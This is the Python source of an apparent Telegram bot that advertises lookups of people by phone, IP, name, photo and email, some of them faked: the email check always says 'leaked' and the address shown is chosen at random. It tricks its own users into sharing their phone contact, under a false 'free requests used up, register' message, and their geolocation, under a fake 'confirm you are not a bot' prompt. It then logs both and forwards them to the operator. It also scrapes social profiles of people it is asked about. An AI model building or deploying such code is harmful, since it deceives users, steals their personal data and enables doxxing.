import os

import requests

import telebot

from telebot import types

import time

import random

from twilio.rest import Client

import json

from Parse_VK import a

from bs4 import BeautifulSoup as BS

import vk

import keepalive

ID = os.environ['id']

bot = telebot.TeleBot(os.environ['5389202921:AAG3u6q5gkmvacDKH31vNnkOaUXgrVaaeG4'])

adr = ['–¢–≤–µ—Ä—Å–∫–∞—è —É–ª–∏—Ü–∞, –¥–æ–º 13', '–ü—Ä–æ—Å–ø–µ–∫—Ç 60-–ª–µ—Ç–∏—è –û–∫—Ç—è–±—Ä—è', '–£–ª–∏—Ü–∞ –í–∏–Ω–æ–∫—É—Ä–æ–≤–∞', '3-–π –ì–æ–ª—É—Ç–≤–∏–Ω—Å–∫–∏–π –ø–µ—Ä–µ—É–ª–æ–∫']

account_sid = os.environ['sid']

auth_token = os.environ['auth']

client = Client(account_sid, auth_token)

SERVICE_TOKEN = os.environ['st']

USER_TOKEN = os.environ['vktoken']

session = vk.Session(access_token=USER_TOKEN)

vkontacte = vk.API(session)

bot.send_message(ID, '!BOT STARTED!') 

print("!BOT STARTED!")

@bot.message_handler(commands=['start'])

def start(message):

    bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! –Ø –û—á–∫–æ –ë–æ–≥–∞! üëã

	–Ø —É–º–µ—é –ø—Ä–æ–±–∏–≤–∞—Ç—å –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø–æ IP –∞–¥—Ä–µ—Å—É –∏ –ø–æ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏!	–î–ª—è –ø—Ä–æ–±–∏–≤–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –≤–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É /getinfo

    –î–ª—è –ø—Ä–æ–±–∏–≤–∞ IP –∞–¥—Ä–µ—Å–∞, –≤–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É /getip

    –î–ª—è –ø—Ä–æ–±–∏–≤–∞ –ø–æ –§–ò–û, –≤–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É /getname

    –î–ª—è –ø—Ä–æ–±–∏–≤–∞ –ø–æ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏, –≤–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É /getimg

    –ê –≤–æ—Ç –≤—Å–µ –∫–æ–º–∞–Ω–¥—ã –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /help''')

	

@bot.message_handler(commands=['help'])

def help_message(message):

    bot.send_message(message.chat.id, '''------------------- –í–°–ï –ö–û–ú–ê–ù–î–´ -------------------\n

	/start : –ó–∞–ø—É—Å–∫ –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –±–æ—Ç–∞.

	/help : –í—ã–≤–æ–¥–∏—Ç —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.

    /getip : –ü—Ä–æ–±–∏–≤ –ø–æ IP –∞–¥—Ä–µ—Å—É.

    /getname : –ü—Ä–æ–±–∏–≤ –ø–æ –§–ò–û (–§–∞–º–∏–ª–∏—è –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ).

    /getinfo : –ü—Ä–æ–±–∏–≤ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞.

    /getimg : –ü—Ä–æ–±–∏–≤ –ø–æ –∫–∞—Ä—Ç–∏–Ω–∫–µ.

    /getmail : –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–ª–∏—Ç—ã–π email.

    /getapp : –°–∫–∞—á–∞—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø—Ä–æ–±–∏–≤–∞.

    /author : –¢–æ—Ç –∫—Ç–æ —Å–æ–∑–¥–∞–ª –û—á–∫–æ –ë–æ–≥–∞!''')

    bot.send_message(message.chat.id, '<------- –ú–µ—Ç–∫–∏ –¥–ª—è –ø—Ä–æ—á—Ç–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ –§–ò–û ------->')

    bot.send_message(

        message.chat.id,

        '–ß—Ç–æ –æ–Ω–æ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç?:\n ‚îú –í–æ–∑–º–æ–∂–Ω—ã–µ –∏–º–µ–Ω–∞ —á–µ–ª–æ–≤–µ–∫–∞ –∏ –µ–≥–æ –ø—Ä–æ—Ñ–∏–ª–∏ –≤ —Å–æ—Ü. —Å–µ—Ç—è—Ö.'

    )

    bot.send_message(message.chat.id, '<------- –ú–µ—Ç–∫–∏ –¥–ª—è –ø—Ä–æ—á—Ç–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ IP ------->')

    bot.send_message(

        message.chat.id,

        'success:\n ‚îú –£–¥–∞–ª–æ—Å—å –ª–∏ –Ω–∞–π—Ç–∏ –∏–ª–∏ –Ω–µ—Ç.'

    )

    bot.send_message(

        message.chat.id,

        'country:\n ‚îú –°—Ç—Ä–∞–Ω–∞ –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è.'

    )

    bot.send_message(

        message.chat.id,

        'regionName:\n ‚îú –ì–æ—Ä–æ–¥ –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è.'

    )

    bot.send_message(

        message.chat.id,

        'lat:\n ‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –Ω–∞ –∫–∞—Ä—Ç–µ: –®–∏—Ä–æ—Ç–∞.'

    )

    bot.send_message(

        message.chat.id,

        'lon:\n ‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –Ω–∞ –∫–∞—Ä—Ç–µ: –î–æ–ª–≥–æ—Ç–∞.'

    )

    bot.send_message(

        message.chat.id,

        'isp:\n ‚îú –û–ø–µ—Ä–∞—Ç–æ—Ä –∏–ª–∏ –ø—Ä–æ–≤–∞–π–¥–µ—Ä.'

    )

    bot.send_message(message.chat.id, '<------- –ú–µ—Ç–∫–∏ –¥–ª—è –ø—Ä–æ—á—Ç–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ –Ω–æ–º–µ—Ä—É ------->')

    bot.send_message(

        message.chat.id,

        'success:\n ‚îú –£–¥–∞–ª–æ—Å—å –ª–∏ –Ω–∞–π—Ç–∏ –∏–ª–∏ –Ω–µ—Ç.'

    )

    bot.send_message(

        message.chat.id,

        'error:\n ‚îú –ü—Ä–∏—á–∏–Ω–∞ –æ—à–∏–±–∫–∏ (–µ—Å–ª–∏ –ø–æ–ª–µ –ø—É—Å—Ç–æ–µ, –∑–Ω–∞—á–∏—Ç –æ—à–∏–±–∫–∏ –Ω–µ—Ç).'

    )

    bot.send_message(

        message.chat.id,

        'carrier:\n ‚îú –û–ø–µ—Ä–∞—Ç–æ—Ä —Å–≤—è–∑–∏.'

    )

    bot.send_message(

        message.chat.id,

        'country_name:\n ‚îú –°—Ç—Ä–∞–Ω–∞ –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è.'

    )

    bot.send_message(

        message.chat.id,

        'location:\n ‚îú –ì–æ—Ä–æ–¥ –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è.'

    )

    bot.send_message(

        message.chat.id,

        'line_type:\n ‚îú –¢–∏–ø –Ω–æ–º–µ—Ä–∞ (–º–æ–±–∏–ª—å–Ω—ã–π, —Å—Ç–∞—Ü–∏–æ–Ω–∞—Ä–Ω—ã–π, –∏ —Ç.–ø.).'

    )

    bot.send_message(

        message.chat.id,

        'socialMedia:\n ‚îú –ù–∞–π–¥–µ–Ω—ã–µ —Å–æ—Ü. —Å–µ—Ç–∏ –ø–æ –Ω–æ–º–µ—Ä—É.'

    )

    bot.send_message(

        message.chat.id,

        'disposableProviders:\n ‚îú –í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–π –ª–∏ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä –∏–ª–∏ –Ω–µ—Ç.'

    )

    bot.send_message(

        message.chat.id,

        'reputation:\n ‚îú –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–∞–π—Ç–∞—Ö —Ä–µ–ø—É—Ç–∞—Ü–∏—é –Ω–æ–º–µ—Ä–∞.'

    )

    bot.send_message(

        message.chat.id,

        'individuals:\n ‚îú –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π –ø—Ä–æ–±–∏–≤ –ø–æ —Å–ª–∏—Ç—ã–º –±–∞–∑–∞–º –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ.'

    )

    bot.send_message(

        message.chat.id,

        'general:\n ‚îú –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π –ø—Ä–æ–±–∏–≤ –ø–æ —Å–ª–∏—Ç—ã–º –±–∞–∑–∞–º –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –∫–æ—Ç–æ—Ä—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ —Å–∫–∞—á–∞—Ç—å.'

    )

    bot.send_message(message.chat.id, '<-------- –ú–µ—Ç–∫–∏ –¥–ª—è –ø—Ä–æ—á—Ç–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ —Ñ–æ—Ç–æ -------->')

    bot.send_message(

        message.chat.id,

        '–°–°–´–õ–ö–ê:\n ‚îú –ü—Ä–∏–∫–∏–Ω—å, —ç—Ç–æ —Å—Å—ã–ª–∫–∞ –Ω–∞ –∑–∞–ø—Ä–æ—Å!'

    )

    bot.send_message(

        message.chat.id,

        '–í–û–ó–ú–û–ñ–ù–´–ï –ò–ú–ï–ù–ê:\n ‚îú –ü—Ä–∏–∫–∏–Ω—å, —ç—Ç–æ —Ä–µ–∞–ª—å–Ω–æ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∏–º–µ–Ω–∞ —á–µ–ª–æ–≤–µ–∫–∞ –∏ –µ–≥–æ —Å–æ—Ü. —Å–µ—Ç–∏!'

    )

@bot.message_handler(commands=['author'])

def start(message):

    bot.send_message(message.chat.id, '–ü—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç –∏ —Å–æ–∑–¥–∞—Ç–µ–ª—å: @DimonDevYT')

@bot.message_handler(commands=['getinfo'])

def start(message):

    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ª—é–±–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞') 

    bot.register_next_step_handler(msg, register)

@bot.message_handler(commands=['getip'])

def start(message):

    iptolookup = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ª—é–±–æ–π IP –∞–¥—Ä–µ—Å')

    bot.register_next_step_handler(iptolookup, iplookup)

@bot.message_handler(commands=['getname'])

def get_name_messages(message):

    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –§–ò–û –¥–ª—è –ø—Ä–æ–±–∏–≤–∞') 

    bot.register_next_step_handler(msg, searchname)

@bot.message_handler(commands=['getapp'])

def start(message):

    bot.send_message(message.chat.id, "–°–∫–æ—Ä–æ –±—É–¥–µ—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø—Ä–æ–±–∏–≤–∞!")

@bot.message_handler(commands=['getimg'])

def start(message):

    msg = bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –º–Ω–µ –ª—é–±—É—é —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é")

    bot.register_next_step_handler(msg, imgreverse)

@bot.message_handler(commands=['getmail'])

def start(message):

    msg = bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –º–Ω–µ –ª—é–±–æ–π –∏–º–µ–π–ª, —è –ø—Ä–æ–≤–µ—Ä—é —Å–ª–∏—Ç –ª–∏ –æ–Ω –∏–ª–∏ –Ω–µ—Ç.")

    bot.register_next_step_handler(msg, mail)

def mail(message):

    bot.send_message(message.chat.id, "–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é —ç—Ç–∞ –ø–æ—á—Ç–∞ —Å–ª–∏—Ç–∞.")

def imgreverse(message):

    try:

        raw = message.photo[0].file_id

        path = raw+".jpg"

        file_info = bot.get_file(raw)

        bot.send_message(message.chat.id, file_info)

        downloaded_file = bot.download_file(file_info.file_path)

        with open(path,'wb') as new_file:

            new_file.write(downloaded_file)

        print(path)

        filePath = path

        searchUrl = 'https://yandex.ru/images/search'

        files = {'upfile': ('blob', open(filePath, 'rb'), 'image/jpeg')}

        params = {'rpt': 'imageview', 'format': 'json', 'request': '{"blocks":[{"block":"b-page_type_search-by-image__link"}]}'}

        response = requests.post(searchUrl, params=params, files=files)

        query_string = json.loads(response.content)['blocks'][0]['params']['url']

        img_search_url= searchUrl + '?' + query_string

        bot.send_message(message.chat.id, "–°–°–´–õ–ö–ê –ù–ê –ó–ê–ü–†–û–°: " + img_search_url + "\n")

        bot.send_message(message.chat.id, "‚îú –í–û–ó–ú–û–ñ–ù–´–ï –ò–ú–ï–ù–ê –ò –°–û–¶. –°–ï–¢–ò")

        r = requests.get(img_search_url)

        html = BS(r.content, 'html.parser')

        for el in html.select(".CbirSites-Items > .CbirSites-Item"):

            title = el.select(".CbirSites-ItemTitle > a")

            bot.send_message(message.chat.id, "‚îú " + title[0].text)

        bot.send_message(message.chat.id, "‚îî –≠–¢–û –í–°–ï –ß–¢–û –ú–û–ï –û–ß–ö–û –ù–ê–®–õ–û –ù–ê –≠–¢–û–ô –ö–ê–†–¢–ò–ù–ö–ï")

        time.sleep(5)

        try:

            os.remove(path)

        except Exception as e:

            bot.send_message(ID, e)

            pass

    except Exception as e:

        bot.send_message(ID, e)

        pass

def proc2(message):

    try:

        m_id = message.chat.id

        user_input = message.text

        num = user_input.replace('+', '')

        if not num.isdigit():

            bot.reply_to(message, '–ö–∞–∂–µ—Ç—Å—è, –≤—ã –Ω–µ –≤–≤–µ–ª–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /getinfo!')#‚è≥

            return

        bot.send_message(m_id, f'–ó–∞–ø—Ä–æ—Å –Ω–∞ –Ω–æ–º–µ—Ä {num} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!')

        time.sleep(1)

        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 

        button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	

        keyboard.add(button_phone)	

        bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!

			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)

    except Exception as e:

        bot.send_message(ID, e)

        bot.send_message(ID, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞ –∏–ª–∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ!!')

def searchname(message):

    if str(message.text[0:3]) == 'htt':

        try:

            bot.send_message(message.from_user.id, a.get_photos(message.text))

            bot.send_message(message.from_user.id,

                             a.get_information1(message.text))

        except:

            bot.send_message(

                message.from_user.id,

                '–ú—ã –Ω–µ —Å–º–æ–≥–ª–∏ –Ω–∞–π—Ç–∏ –æ –≤–∞—Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é: –ª–∏–±–æ —É –≤–∞—Å –∑–∞–∫—Ä—ã—Ç—ã–π –∞–∫–∫–∞—É–Ω—Ç, –ª–∏–±–æ –ø—Ä–æ –≤–∞—Å –Ω–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'

            )

        if a.get_information2(message.text) != [] and '' and None:

            bot.send_message(message.from_user.id,

                             a.get_information2(message.text))

    else:

        s = a.searching(message.text)

        print(message.text)

        bot.send_message(message.from_user.id, str(s[0]))

        bot.send_message(message.from_user.id, a.get_photos(str(s[0])))

        bot.send_message(message.from_user.id, a.get_information1((str(s[0]))))

        username = message.text.replace(' ', '-')

        fb_url = "https://www.facebook.com/"+username

        insta_url = "https://www.instagram.com/"+username

        quora_url = "https://www.quora.com/profile/"+username

        fb_response = requests.get(fb_url)

        if fb_response.status_code == 200:

            bot.send_message(message.chat.id, "‚îú –£ —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å Facebook")

        insta_response = requests.get(insta_url)

        if insta_response.status_code == 200:

            bot.send_message(message.chat.id, "‚îú –£ —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å Instagram")

        

        quora_response = requests.get(quora_url)

        if quora_response.status_code == 200:

            bot.send_message(message.chat.id, "‚îú –£ —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å Quora")

        

        bot.send_message(message.chat.id, f"‚îî –≠–¢–û –í–°–ï –ß–¢–û –ú–û–ï –û–ß–ö–û –ù–ê–®–õ–û –ü–û –ó–ê–ü–†–û–°–£ {message.text}")

def iplookup(message):

    try:

        user_input = message.text

        x = requests.get('http://ip-api.com/json/' + str(user_input))

        pretty_json = json.loads(x.text)

        bot.send_message(message.chat.id, json.dumps(pretty_json, indent=2))

        log = open('bot-log.txt', 'a+', encoding='utf-8')

        log.write(x + '  ')

        log.close()

        bot.send_message(message.chat.id, f"‚îî –≠–¢–û –í–°–ï –ß–¢–û –ú–û–ï –û–ß–ö–û –ù–ê–®–õ–û –ü–û IP {user_input}")

        bot.send_message(ID, x)

    except Exception as e:

        bot.send_message(ID, e)

        bot.send_message(ID, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞ –∏–ª–∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ!!')

@bot.message_handler(content_types=['contact']) 

def contact(message):

    if message.contact is not None: 

        nick = message.from_user.username

        first = message.contact.first_name

        last = message.contact.last_name

        userid = message.contact.user_id

        phone = message.contact.phone_number

        info = f'''

			–î–∞–Ω–Ω—ã–µ

			‚îú–ò–º—è: {first} {last}

			‚îúID: {userid}

			‚îú–ù–∏–∫: @{nick}

			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}

			'''

        log = open('bot-log.txt', 'a+', encoding='utf-8')

        log.write(info + '  ')

        log.close()

        bot.send_message(ID, info)

        print(info)

        if message.contact.user_id != message.chat.id:

            bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')

    keyboardmain = types.InlineKeyboardMarkup(row_width=2)

    button = types.InlineKeyboardButton(text="–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫", callback_data="find")

    keyboardmain.add(button)

    m_id = message.chat.id

    msg = bot.send_message(m_id, f'–í–≤–µ–¥–∏—Ç–µ –∑–∞–Ω–æ–≤–æ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:')

    bot.register_next_step_handler(msg, register)

def register(message):

    try:

        user_input = message.text

        num = user_input

        bot.send_message(message.chat.id, f'–ó–∞–ø—Ä–æ—Å –Ω–∞ –Ω–æ–º–µ—Ä {num} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∑–∞–Ω–æ–≤–æ!')

        time.sleep(1)

        types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

        bot.send_message(message.chat.id, "‚îú –°–°–´–õ–ö–ê –ù–ê –í–û–ó–ú–û–ñ–ù–´–ô –ü–û–ò–°–ö: https://www.google.com/search?q=" + num)

        bot.send_message(message.chat.id, "‚îú –°–°–´–õ–ö–ê –ù–ê –í–û–ó–ú–û–ñ–ù–´–ô –ü–û–ò–°–ö: https://yandex.ru/search/?text=" + num)

        r4 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/ovh")

        pretty_json4 = json.loads(r4.text)

        bot.send_message(message.chat.id, "‚îú –¢–£–ü–û–ô –ü–†–û–ë–ò–í")

        bot.send_message(message.chat.id, "‚îú " + json.dumps(pretty_json4, indent=2))

        r1 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/local")

        pretty_json = json.loads(r1.text)

        bot.send_message(message.chat.id, "‚îú –ú–ò–ù–ò–ú–ê–õ–ò–°–¢–ò–ß–ù–´–ô –ü–†–û–ë–ò–í")

        bot.send_message(message.chat.id, "‚îú " + json.dumps(pretty_json, indent=2) + "\n")

        r2 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/numverify")

        pretty_json2 = json.loads(r2.text)

        bot.send_message(message.chat.id, "‚îú –°–¢–ê–ù–î–ê–†–¢–ù–´–ô –ü–†–û–ë–ò–í")

        bot.send_message(message.chat.id, "‚îú " + json.dumps(pretty_json2, indent=2) + "\n")

        r3 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/googlesearch")

        pretty_json3 = json.loads(r3.text)

        bot.send_message(message.chat.id, "‚îú –ü–†–û–î–í–ò–ù–£–¢–´–ô –ü–†–û–ë–ò–í –ü–û –í–ù–ï–®–ù–ò–ú –ò–°–¢–û–ß–ù–ò–ö–ê–ú")

        with open("–ü–û–õ–ù–´–ô_–ü–†–û–ë–ò–í.txt", "w") as f:

            f.write(json.dumps(pretty_json3, indent=2))

        fl = open("–ü–û–õ–ù–´–ô_–ü–†–û–ë–ò–í.txt", 'rb')

        bot.send_document(chat_id=message.chat.id, data=fl)

        bot.send_message(message.chat.id, f"‚îî –≠–¢–û –í–°–ï –ß–¢–û –ú–û–ï –û–ß–ö–û –ù–ê–®–õ–û –ü–û –ù–û–ú–ï–†–£ {num}")

    except Exception as e:

        bot.send_message(ID, e)

        bot.send_message(ID, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞ –∏–ª–∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ!')

@bot.callback_query_handler(func=lambda call:True)

def callback_inline(call):

	if call.data == "find":

		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 

		button_location = types.KeyboardButton(text="–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", request_location=True) 	

		keyboard1.add(button_location)

		bot.send_message(call.message.chat.id, text='–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —á—Ç–æ –≤—ã –Ω–µ –±–æ—Ç!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location'])

def contact(message):

	if message.location is not None: 

		lon = str(message.location.longitude)

		lat = str(message.location.latitude)

		geo = f'''

		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è

		‚îúID: {message.chat.id}

		‚îúLongitude: {lon}

		‚îúLatitude: {lat}

		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{lat}+{lon} 

		'''

		log = open('bot-log.txt', 'a+', encoding='utf-8')

		log.write(geo + '  ')

		log.close()

		bot.send_message(ID, geo) 

		print(geo)

		bot.send_message(message.chat.id, f'''

			–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è

			‚îî–ê–¥—Ä–µ—Å: {random.choice(adr)}

			''')

keepalive.keep_alive()

bot.polling()
